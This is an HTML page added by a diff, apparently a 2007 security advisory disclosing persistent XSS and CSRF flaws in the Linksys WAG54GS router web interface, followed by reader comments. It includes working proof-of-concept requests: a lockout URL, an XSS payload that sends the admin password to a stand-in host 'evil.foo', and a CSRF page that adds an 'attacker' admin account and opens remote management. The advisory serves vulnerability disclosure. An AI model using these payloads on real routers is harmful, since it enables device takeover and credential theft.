@@ -1,0 +1,81 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)</title><meta name="description" content="I really think that web interfaces are the low-hanging fruit of embedded devices. Sure classic attacks such as predictable SNMP community strings, exposed TFTP services and buffer overflows still apply. However, by exploiting the web interface we can steal the data we want, we can enable remote access to the compromised router, we own the victim's connection. In short, bugs on the web interface gives us all we need! Anyway, enough talking! The following are some of the issues I found on the Cisco Linksys WAG54GS."><meta property="name" content="Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)"><meta itemprop="name" content="Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)"><meta property="description" content="I really think that web interfaces are the low-hanging fruit of embedded devices. Sure classic attacks such as predictable SNMP community strings, exposed TFTP services and buffer overflows still apply. However, by exploiting the web interface we can steal the data we want, we can enable remote access to the compromised router, we own the victim's connection. In short, bugs on the web interface gives us all we need! Anyway, enough talking! The following are some of the issues I found on the Cisco Linksys WAG54GS."><meta itemprop="description" content="I really think that web interfaces are the low-hanging fruit of embedded devices. Sure classic attacks such as predictable SNMP community strings, exposed TFTP services and buffer overflows still apply. However, by exploiting the web interface we can steal the data we want, we can enable remote access to the compromised router, we own the victim's connection. In short, bugs on the web interface gives us all we need! Anyway, enough talking! The following are some of the issues I found on the Cisco Linksys WAG54GS."><meta property="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fpersistent-xss-and-csrf-on-wireless-g-adsl-gateway-with-speedbooster-wag54gs%2F?w=1024"><meta itemprop="image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fpersistent-xss-and-csrf-on-wireless-g-adsl-gateway-with-speedbooster-wag54gs%2F?w=1024"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/persistent-xss-and-csrf-on-wireless-g-adsl-gateway-with-speedbooster-wag54gs/"><meta property="og:title" content="Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)"><meta property="og:description" content="I really think that web interfaces are the low-hanging fruit of embedded devices. Sure classic attacks such as predictable SNMP community strings, exposed TFTP services and buffer overflows still apply. However, by exploiting the web interface we can steal the data we want, we can enable remote access to the compromised router, we own the victim's connection. In short, bugs on the web interface gives us all we need! Anyway, enough talking! The following are some of the issues I found on the Cisco Linksys WAG54GS."><meta property="og:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fpersistent-xss-and-csrf-on-wireless-g-adsl-gateway-with-speedbooster-wag54gs%2F?w=1024"><meta name="twitter:title" content="Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)"><meta name="twitter:description" content="I really think that web interfaces are the low-hanging fruit of embedded devices. Sure classic attacks such as predictable SNMP community strings, exposed TFTP services and buffer overflows still apply. However, by exploiting the web interface we can steal the data we want, we can enable remote access to the compromised router, we own the victim's connection. In short, bugs on the web interface gives us all we need! Anyway, enough talking! The following are some of the issues I found on the Cisco Linksys WAG54GS."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="http://s.wordpress.com/mshots/v1/https%3A%2F%2Fwww.gnucitizen.org%2Fblog%2Fpersistent-xss-and-csrf-on-wireless-g-adsl-gateway-with-speedbooster-wag54gs%2F?w=1024"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Persistent XSS and CSRF on Wireless-G ADSL Gateway with SpeedBooster (WAG54GS)</h1><div>Tue, 20 Nov 2007 20:51:16 GMT</div><div id="post-content"><p>I really think that web interfaces are the <em>low-hanging fruit</em> of embedded devices. Sure classic attacks such as predictable SNMP community strings, exposed TFTP services and buffer overflows still apply. However, by exploiting the web interface we can steal the data we want, we can enable remote access to the compromised router, we own the victim&#39;s connection. In short, bugs on the web interface gives us all we need! Anyway, enough talking! The following are some of the issues I found on the Cisco Linksys WAG54GS.</p>
+<p>The following vulns were found on 24 June 2007 and were tested against firmware V1.00.06. The specific persistent XSS holes mentioned in this advisory were fixed by Cisco on firmware version V1.01.03. However, there are still several other persistent XSS plus the system-wide CSRF in the latest firmware. <a href="http://nvd.nist.gov/nvd.cfm?cvename=CVE-2007-3574">CVE-2007-3574</a> has been assigned to these issues. Thanks a lot to Cisco for being so great when dealing with my emails! Credits also go to pdp for providing feedback, ideas and allowing me to play with his spare <a href="http://snipurl.com/1txmt">WAG54GS</a> router.</p>
+<p>By the way, part of this advisory got leaked some time ago on FD, but I am publishing it as a formal release with additional information including a password leak which can be combined with any of the persistent XSS holes found (keep reading for more info on this).</p>
+<h3 id="description">Description</h3>
+<p>There are several persistent XSS vulnerabilities on the <code>/setup.cgi</code> script. It is possible to inject JavaScript by assigning a payload like the following to any of the vulnerable parameters:</p>
+<pre><code>&gt;&lt;script&gt;[PAYLOAD]&lt;/script&gt;
+
+The vulnerable (non-sanitized) parameters are the following: `devname`, `snmp_getcomm`, `snmp_setcomm`, `c4_trap_ip_`. Additionally, all HTTP requests are not tokenized with random values. Thus, all requests to the router&#39;s HTTP interface are vulnerable to Cross-site Request Forgeries (CSRF), perhaps by design. The following is an example of a HTTP request (notice the lack of non-predictable tokens):
+
+POST /setup.cgi HTTP/1.1
+Authorization: Basic YWRtaW46YWRtaW4=
+
+mtenRestore=Restore+Factory+Defaults&amp;todo=defaultsettings&amp;this_file=Factorydefaults.htm&amp;next_file=index.htm&amp;message=
+
+Although the original request is a POST, we can convert it to a GET, so that all posted parameters can be submitted on a single URL. For example, the previous POST request can be converted to a URL such as the following:
+
+http://admin:admin@192.168.1.1/setup.cgi?mtenRestore=Restore+Factory+Defaults&amp;todo=defaultsettings&amp;this_file=Factorydefaults.htm&amp;next_file=index.htm&amp;message=
+
+By forging administrative requests (Administration button on the router&#39;s HTML menu), an attacker can compromise the router provided the victim user visits a malicious URL or HTML page. The attack can only be successful if the administrator hasn&#39;t changed the default credentials (admin/admin) or the administrator&#39;s browser has an active authentication session with the router&#39;s interface when the attack happens (highly unlikely)
+
+### Persistent XSS PoC
+
+The following URL creates a DoS condition by making the Administration page inaccessible since `history.back()` will run every time the Administration page is visited. Thus the administrator won&#39;t be able to ever change the default credentials unless a hard reset is performed by using the router&#39;s physical &quot;restart&quot; switch:
+
+http://admin:admin@192.168.1.1/setup.cgi?user_list=1&amp;sysname=admin&amp;sysPasswd=admin&amp;sysConfirmPasswd=admin&amp;remote_management=enable&amp;http_wanport=8080&amp;devname=&amp;snmp_enable=disable&amp;upnp_enable=enable&amp;wlan_enable=enable&amp;save=Save+Settings&amp;h_user_list=1&amp;h_pwset=yes&amp;pwchanged=yes&amp;h_remote_management=enable&amp;c4_trap_ip_=&quot;&gt;history.back()&amp;h_snmp_enable=enable&amp;h_upnp_enable=enable&amp;h_wlan_enable=enable&amp;todo=save&amp;this_file=Administration.htm&amp;next_file=Administration.htm&amp;message=
+
+Note that he administration page (`/setup.cgi?next_file=Administration.htm`) returns the admin password within the client-side HTML source code as a hidden field. i.e.:
+
+&lt;input type=&quot;hidden&quot; name=&quot;old_pwd&quot; value=&quot;admin&quot;&gt;
+
+Therefore, we could also inject a payload in our persistent XSS attack which accesses the admin password through the DOM object:
+
+document.administration.old_pwd.value
+
+...and submits it to the attacker&#39;s site every time the page is accessed. That way, even if the victim admin changed the password, the attacker would receive the value of the new password! Here is an example payload:
+
+&quot;&gt;&lt;script&gt;img=new Image();img.src=&#39;http://evil.foo/?last_pwd=&#39;+document.administration.old_pwd.value&lt;/script&gt;&lt;a b=&quot;
+
+### CSRF PoC
+
+The following HTML page does the following:</code></pre><ul>
+<li><p>adds an additional administrative account, with a username equals to &#39;attacker&#39; and a password equals to 0wned (without removing original admin account!)</p>
+</li>
+<li><p>enables remote HTTP management over port 1337</p>
+</li>
+<li><p>sets other settings that are inrelevant to this discussion</p>
+  <html>
+  <body>
+      <script>
+      // send 2 requests to add an administrative account and enable remote management
+      // tries with default credentials and with credentials cached by browser (if any)
+
+<pre><code>  var img = new Image();
+  var img2 = new Image();
+
+  img.src = &#39;http://admin:admin@192.168.1.1/setup.cgi?user_list=8&amp;sysname=attacker&amp;sysPasswd=0wned&amp;sysConfirmPasswd=0wned&amp;remote_management=enable&amp;http_wanport=1337&amp;devname=&amp;snmp_enable=disable&amp;upnp_enable=enable&amp;wlan_enable=enable&amp;save=Save+Settings&amp;h_user_list=8&amp;h_pwset=yes&amp;pwchanged=yes&amp;h_remote_management=enable&amp;c4_trap_ip_=&amp;h_snmp_enable=disable&amp;h_upnp_enable=enable&amp;h_wlan_enable=enable&amp;todo=save&amp;this_file=Administration.htm&amp;next_file=Administration.htm&amp;message=&#39;;
+  img2.src = &#39;http://192.168.1.1/setup.cgi?user_list=8&amp;sysname=attacker&amp;sysPasswd=0wned&amp;sysConfirmPasswd=0wned&amp;remote_management=enable&amp;http_wanport=1337&amp;devname=&amp;snmp_enable=disable&amp;upnp_enable=enable&amp;wlan_enable=enable&amp;save=Save+Settings&amp;h_user_list=8&amp;h_pwset=yes&amp;pwchanged=yes&amp;h_remote_management=enable&amp;c4_trap_ip_=&amp;h_snmp_enable=disable&amp;h_upnp_enable=enable&amp;h_wlan_enable=enable&amp;todo=save&amp;this_file=Administration.htm&amp;next_file=Administration.htm&amp;message=&#39;;
+  &lt;/script&gt;</code></pre>  </body>
+  </html>
+
+</li>
+</ul>
+<p>The first URL forges the administrative request using the default credentials, so it won&#39;t work if default credentials have been changed. The second URL doesn&#39;t specify any credentials as an attempt to use the browser&#39;s cached credentials. If the admin user has clicked on &quot;Save password&quot; on the basic authentication prompt, most browsers will prompt the user to confirm submitting the cached credentials. The only situation in which browsers won&#39;t ask the user to confirm submitting the credentials would be if the malicious CSRF page was visited while the browser has an active authenticated session with the router&#39;s HTTP interface (very unlikely).</p>
+<h3 id="additional-notes">Additional notes</h3>
+<ul>
+<li>router reboots after saving settings (requests sent to <code>setup.cgi</code>)</li>
+<li>all attacks were tested using Internet Explorer 7</li>
+</ul>
+</div><div id="post-comments"><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Jordan"><span>Jordan</span><div class="post-comment-content">One kinda tangential question -- I haven't played with it in a little while, but when I was doing something similar with a linksys a while back, if you specified the username:password in the url in a link, Firefox would trap the request and alert the user.  
+
+Is there a type of request that bypasses that, or does IE7 not have the same feature? 
+
+I realize that doesn't actually fix the problem, but it at least does give the user a chance to say no and keeps the CSRF from working without their knowledge if they know what they're doing (hah!)
+
+Unless of course they're still logged in to the router when the attack occurs in which case no need to pass the credentials in the URL at all...</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="Adrian Pastor"><span>Adrian Pastor</span><div class="post-comment-content">Jordan, newer browsers like FF 2 spawn a warning when typing 'http://admin:admin@192.168.1.1/' and similar URLs which submit basic auth credentials.
+
+However, when playing with these attacks I remember getting more a interesting behavior on FF 2 if embedding URLs within HTML - ie: on iframes.
+
+Anyway, the best persistent XSS/CSRF type of flaw you can get is within log facilities. Reason being is that when the injected payload is triggered, the victim admin must be logged in by design (in order to check the logs) - hence no need to submit the password along the CSRFed request. 
+
+I found something like this on Axis IP cameras: http://www.procheckup.com/Vulnerability_Axis_2100_research.pdf</div></div><div class="post-comment"><img src="//gravatar.com/avatar/#{comment.avatar}?s=256&amp;d=retro" alt="hackathology"><span>hackathology</span><div class="post-comment-content">Nice one</div></div></div></div></article><footer id="footer"><p>Copyright &copy; 2019 <a href=""></a>. All rights reserved.</p></footer></body></html>
